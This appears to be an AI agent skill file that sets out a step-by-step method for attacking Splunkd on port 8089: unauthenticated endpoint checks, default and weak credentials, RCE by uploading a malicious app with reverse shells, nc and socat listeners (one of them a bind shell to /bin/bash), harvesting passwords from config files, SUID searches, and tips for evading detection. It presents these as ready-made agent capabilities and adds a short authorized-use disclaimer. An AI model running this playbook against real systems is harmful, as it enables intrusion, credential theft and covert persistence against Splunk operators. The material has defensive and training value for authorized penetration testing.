---
name: splunkd-pentest
description: How to pentest Splunkd services (port 8089) for vulnerability assessment and exploitation. Use this skill whenever the user mentions Splunk, port 8089, Splunkd, log analytics security testing, or needs to assess Splunk installations for vulnerabilities including RCE, credential weaknesses, and free version exploitation. Trigger for any Splunk security assessment, penetration testing, or vulnerability research tasks.
---

# Splunkd Pentesting Skill

A comprehensive guide for assessing and exploiting Splunkd services (port 8089) during security assessments.

## When to Use This Skill

Use this skill when:
- You need to assess Splunk installations for security vulnerabilities
- Port 8089 is open and identified as Splunkd
- You're conducting penetration testing on log analytics infrastructure
- You need to test for RCE vulnerabilities in Splunk services
- You're evaluating Splunk security configurations
- You need to generate reverse shell payloads for Splunk exploitation

## Quick Start

```bash
# Check if Splunkd is running
nmap -p 8089 <target>

# Check version via Shodan or direct enumeration
splunkd --version
```

## Vulnerability Assessment

### 1. Free Version Exploitation

The free version of Splunk lacks authentication after the 60-day trial expires:

```bash
# Check for unauthenticated access
curl -v http://<target>:8089/services/server/info

# Look for authentication bypass indicators
# Free version may expose sensitive endpoints without auth
```

**Key indicators:**
- No authentication required for API endpoints
- Trial version converted to free after 60 days
- Administrators may overlook security implications

### 2. Credential Weaknesses

Test for default and weak credentials:

```bash
# Default credentials (older versions)
admin:changeme

# Common weak passwords to test
admin
Welcome
Password123
Splunk123
```

**Enumeration approach:**
1. Check Splunk version to determine credential scheme
2. Test default credentials first
3. Use wordlists for common weak passwords
4. Check for credential exposure in configuration files

### 3. Remote Code Execution (RCE)

Splunk offers multiple RCE vectors through custom application deployment.

## RCE Exploitation Methodology

### Custom Application Deployment

Splunk allows custom applications that can execute scripts on both Windows and Linux. This is the primary RCE vector.

**Application Structure:**
```
splunk_shell/
├── bin/           # Reverse shell scripts
│   ├── rev.py     # Python reverse shell
│   └── run.ps1    # PowerShell reverse shell (Windows)
└── default/
    └── inputs.conf # Configuration to enable script execution
```

### Step-by-Step Exploitation

1. **Create the malicious application package**
   - Use the `generate_splunk_payload.py` script (see Scripts section)
   - Customize IP and port for your listener

2. **Set up a listener**
   ```bash
   # Netcat listener
   nc -lvnp 443
   
   # Or socat for more control
   socat TCP-LISTEN:443,reuseaddr,fork EXEC:/bin/bash
   ```

3. **Upload the application**
   - Access Splunk web interface (port 8000) or API (port 8089)
   - Navigate to Apps > Manage Apps
   - Upload the malicious application package

4. **Trigger execution**
   - Scripts execute automatically upon upload
   - Default interval: 10 seconds
   - Reverse shell should connect to your listener

### Cross-Platform Support

Splunk comes with Python pre-installed, enabling cross-platform exploitation:

- **Linux:** Python, Bash scripts
- **Windows:** Python, PowerShell, Batch scripts
- **Universal:** Python works on both platforms

## Scripts

### Generate Splunk Payload

Use `scripts/generate_splunk_payload.py` to create the malicious application package:

```bash
# Generate payload for Linux target
python scripts/generate_splunk_payload.py \
  --target-ip 10.10.10.10 \
  --target-port 443 \
  --platform linux \
  --output splunk_shell/

# Generate payload for Windows target
python scripts/generate_splunk_payload.py \
  --target-ip 10.10.10.10 \
  --target-port 443 \
  --platform windows \
  --output splunk_shell/
```

### Generate Reverse Shell Payloads

Use `scripts/generate_reverse_shell.py` to create custom reverse shell scripts:

```bash
# Python reverse shell (Linux)
python scripts/generate_reverse_shell.py \
  --type python \
  --ip 10.10.10.10 \
  --port 443

# PowerShell reverse shell (Windows)
python scripts/generate_reverse_shell.py \
  --type powershell \
  --ip 10.10.10.10 \
  --port 443
```

## Example Exploitation Flow

**Scenario:** You've identified Splunkd on port 8089 during enumeration.

1. **Initial Reconnaissance**
   ```bash
   # Check version and configuration
   curl http://<target>:8089/services/server/info
   
   # Look for authentication status
   curl -v http://<target>:8089/services/auth/login
   ```

2. **Test for Free Version**
   ```bash
   # If no authentication required, free version likely
   # Check for exposed endpoints
   curl http://<target>:8089/services/search/jobs
   ```

3. **Attempt Credential Access**
   ```bash
   # Try default credentials
   curl -u admin:changeme http://<target>:8089/services/server/info
   ```

4. **Deploy RCE Payload**
   ```bash
   # Generate payload
   python scripts/generate_splunk_payload.py \
     --target-ip <your-ip> \
     --target-port 443 \
     --platform linux \
     --output splunk_shell/
   
   # Start listener
   nc -lvnp 443 &
   
   # Upload via Splunk interface or API
   # (requires authentication or free version access)
   ```

5. **Post-Exploitation**
   - Once shell is obtained, check for privilege escalation opportunities
   - Splunk often runs with elevated privileges
   - Check for sensitive data in Splunk indexes
   - Look for additional credentials in configuration files

## Privilege Escalation

After initial access, check for privilege escalation:

```bash
# Check Splunk user privileges
id

# Look for sensitive configuration files
cat /opt/splunk/etc/system/local/server.conf
cat /opt/splunk/etc/system/local/inputs.conf

# Check for stored credentials
grep -r "password" /opt/splunk/etc/

# Look for SUID binaries or misconfigurations
find /opt/splunk -perm -4000 -type f 2>/dev/null
```

## Detection Evasion

- Use encoded payloads to avoid signature detection
- Modify script intervals to reduce noise
- Consider using legitimate-looking application names
- Test in non-production environments first

## References

- [HackTheBox Academy - Splunk Module](https://academy.hackthebox.com/module/113/section/1213)
- [Reverse Shell Splunk GitHub](https://github.com/0xjpuff/reverse_shell_splunk)
- [Splunk Security Documentation](https://docs.splunk.com/Documentation/Splunk/latest/Security/Overview)

## Important Notes

- **Legal Use Only:** This skill is for authorized security assessments only
- **Authorization Required:** Always have written permission before testing
- **Impact Awareness:** RCE exploitation can disrupt services
- **Documentation:** Document all findings and remediation steps
- **Responsible Disclosure:** Report vulnerabilities to appropriate parties

## Troubleshooting

**Payload not executing:**
- Check `inputs.conf` configuration
- Verify `disabled = 0` is set
- Ensure script has execute permissions
- Check Splunk logs for errors

**Connection refused:**
- Verify listener is running
- Check firewall rules on target
- Confirm correct IP/port in payload

**Authentication required:**
- Try default credentials
- Check for free version indicators
- Look for credential exposure in configs
